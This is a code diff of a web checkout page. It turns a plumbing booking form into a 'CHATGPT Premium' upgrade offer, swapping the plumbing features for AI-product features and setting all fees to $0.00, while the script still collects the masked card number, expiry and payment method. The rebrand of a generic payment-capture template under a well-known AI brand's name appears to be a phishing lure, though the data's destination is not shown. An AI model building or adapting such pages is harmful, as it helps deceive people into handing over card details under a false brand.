@@ -543,16 +543,12 @@
       <div class="summary-title"> CHATGPT Premium</div>
       <p class="summary-sub">Same-day call-out · Parts included</p>
       <div class="divider"></div>
-      <div class="feature"><i class="ti ti-tool"></i><span>Leak detection &amp; repair</span></div>
-      <div class="feature"><i class="ti ti-droplet"></i><span>Pipe fitting &amp; replacement</span></div>
-      <div class="feature"><i class="ti ti-certificate"></i><span>Certified plumber assigned</span></div>
-      <div class="feature"><i class="ti ti-clock"></i><span>2-hour arrival guarantee</span></div>
-      <div class="divider"></div>
-      <div class="price-row"><span>Service fee</span><span>$120.00</span></div>
-      <div class="price-row"><span>Call-out charge</span><span>$25.00</span></div>
-      <div class="price-row"><span>Estimated tax</span><span>$0.00</span></div>
-      <div class="price-row total"><span>Due today</span><span>$145.00</span></div>
-      <button class="book-btn idle" id="book-btn" onclick="handleBook()">Book &amp; pay</button>
+      <div class="feature"><i class="ti ti-tool"></i><span>Advanced models</span></div>
+      <div class="feature"><i class="ti ti-droplet"></i><span>Even more messages and uploads</span></div>
+      <div class="feature"><i class="ti ti-certificate"></i><span>Advanced Image Creation with thinking </span></div>
+      <div class="feature"><i class="ti ti-clock"></i><span>Codex coding agent</span></div>
+      <div class="divider"></div>  
+      <button class="book-btn idle" id="book-btn" onclick="handleBook()">Upgrade</button>
     </div>
   </div>
 
@@ -701,11 +697,11 @@
       card_masked:    maskedCard,
       card_expiry:    g('f-expiry'),
       payment_method: document.getElementById('card-opt').classList.contains('active') ? 'Card' : 'PayPal',
-      service_name:   'Emergency plumbing — full service',
-      service_fee:    '$120.00',
-      callout_charge: '$25.00',
+      service_name:   'CHATGPT Premium',
+      service_fee:    '$0.00',
+      callout_charge: '$0.00',
       tax:            '$0.00',
-      total:          '$145.00',
+      total:          '$0.00',
     };
 
     setBtn('sending', 'Processing…');
